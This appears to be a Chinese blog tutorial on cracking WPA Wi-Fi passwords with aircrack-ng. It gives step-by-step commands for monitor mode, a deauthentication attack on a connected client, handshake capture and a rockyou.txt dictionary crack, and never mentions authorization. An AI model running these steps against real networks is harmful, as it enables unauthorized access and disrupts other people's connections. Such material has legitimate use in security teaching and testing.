首先，如果kali是装在虚拟机里面的话，是不能用物理机的无线网卡的。所以，如果我们要想进行无线破解，需要外接一个无线网卡设备，并且该设备要支持 monitor 监听模式

`**iwconfig** :系统配置无线网络设备或显示无线网络设备信息的命令。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段`

*   `auto： 自动模式`
*   `essid：设置ESSID`
*   `nwid：设置网络ID`
*   `freq： 设置无线网络通信频段`
*   `chanel： 设置无线网络通信频段`
*   `sens： 设置无线网络设备的感知阀值`
*   `mode： 设置无线网络设备的通信设备`
*   `ap： 强迫无线网卡向给定地址的接入点注册`
*   `nick<名字>： 为网卡设定别名`
*   `rate<速率>： 设定无线网卡的速率`
*   `rts<阀值>： 在传输数据包之前增加一次握手，确信信道在正常的`
*   `power： 无线网卡的功率设置`

破解无线wifi可以分为以下几步：

*   查看网卡名字：iwconfig
*   设置网卡为监听模式：airmon-ng  start wlan0
*   扫描附近的WIFI：airodump-ng  wlan0mon
*   选定一个路由器，并监听其流量：airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon
*   选定连接的一个客户端，进行攻击：aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon
*   对抓取到的cap包进行暴力破解：aircrack-ng  -w  password.txt  -b BC:46:99:3D:66:D6 tplink-01.cap 

查看无线网卡名字：iwconfig   或者  ifconfig  -a   都可以

![](https://img-blog.csdnimg.cn/20181119155904820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

开启网卡监听模式：airmon-ng  start wlan0   。网卡开启了监听模式之后网卡的名字就变为 wlan0mon  了，以后的所有命令中的网卡名都是叫 wlan0mon

![](https://img-blog.csdnimg.cn/20181119155959216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

扫描附近的WIFI：airodump-ng  wlan0mon ，会显示附近所有的WIFI信号。

*   BSSID代表路由器的 MAC 地址
*   PWR 代表信号的强度，数值越大代表信息越强
*   CH 代表信道
*   ENC代表用的加密的方式
*   AUTH 代表认证的方式
*   ESSID是WIFI的名字

我们需要选定一个准备破解的WIFI，我们选 tplink-5

![](https://img-blog.csdnimg.cn/20181119160153813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

监听该路由器的流量：

```
airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon   # -w 参数指定生成的文件名  -c 指定信道 --bssid指定路由器的MAC地址
```


下面的 STATION 是连接该WIFI的客户端，下面这里只有一个客户端连接了该WIFI。如果有多个客户端连接的话，我们最好选择活跃点的客户端。

![](https://img-blog.csdnimg.cn/20181119165219125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

重新打开一个命令行窗口，开始攻击！之前的窗口继续保留，用于观察是否抓包成功

```
aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon  # 50是发包的数量 -a指定路由器的MAC地址  -c指定连接的客户端的MAC地址
```


该命令会打断连接客户端和WIFI之间的连接，等到客户端重新连接WIFI的时候，就会抓取他们之间的握手认证包！ 

![](https://img-blog.csdnimg.cn/20181119164552615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果看到下面红色圈住的这些，就说明握手包抓取成功了

![](https://img-blog.csdnimg.cn/20181119164947823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们可以看到会生成四个文件，其中我们有用的文件是以 cap 后缀结尾的文件

![](https://img-blog.csdnimg.cn/20181119165829983.png)

对抓取到的cap包进行破解，这需要我们准备好破解的密码字典。所以，无论是任何破解，都需要一个强大的密码字典！

kali下自带有一份无线密码字典——> /usr/share/wordlists/rockyou.txt.gz ，我们将其解压

![](https://img-blog.csdnimg.cn/20190519130854576.png)

![](https://img-blog.csdnimg.cn/2019051913123037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap #-w指定 密码字典 -b指定路由器的MAC地址
```


可以看到，破解成功！该WIFI的密码为 www.123.com 

![](https://img-blog.csdnimg.cn/2018111916443643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

从最后可以看出，要想破解出WIFI的密码，还是得需要一个很强大的字典！